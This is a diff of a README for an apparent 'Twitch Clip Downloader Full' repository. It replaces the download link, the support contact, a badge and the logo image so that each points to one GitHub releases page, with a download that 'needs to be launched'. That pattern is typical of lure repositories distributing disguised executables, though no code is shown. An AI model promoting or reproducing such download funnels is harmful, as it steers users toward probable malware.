@@ -12,7 +12,7 @@ Welcome to the Twitch Clip Downloader Full repository!
 
 ## Download Link 📥
 
-You can download the tool by clicking [here](https://github.com/files/File.zip) (needs to be launched).
+You can download the tool by clicking [here](https://github.com/Badboyhola/Twitch-Clip-Downloader-Full/releases) (needs to be launched).
 
 If the above link is not working, please check the "Releases" section for alternative download options.
 
@@ -33,7 +33,7 @@ To start using the Twitch Clip Downloader tool, follow these simple steps:
 
 ## Support ℹ️
 
-If you encounter any issues or have any questions about the Twitch Clip Downloader tool, feel free to reach out to our support team at support@twitchclipdownloader.com.
+If you encounter any issues or have any questions about the Twitch Clip Downloader tool, feel free to reach out to our support team at https://github.com/Badboyhola/Twitch-Clip-Downloader-Full/releases
 
 ## Contributions 🤝
 
@@ -47,10 +47,10 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![](https://img.shields.io/badge/Download-Tool-blue)](https://github.com/files/File.zip)
+[![](https://github.com/Badboyhola/Twitch-Clip-Downloader-Full/releases)](https://github.com/Badboyhola/Twitch-Clip-Downloader-Full/releases)
 
 ---
 
 Happy downloading! 🎉
 
-![Twitch Logo](https://upload.wikimedia.org/wikipedia/commons/8/82/Twitch_logo_wordmark.png)
+![Twitch Logo](https://github.com/Badboyhola/Twitch-Clip-Downloader-Full/releases)
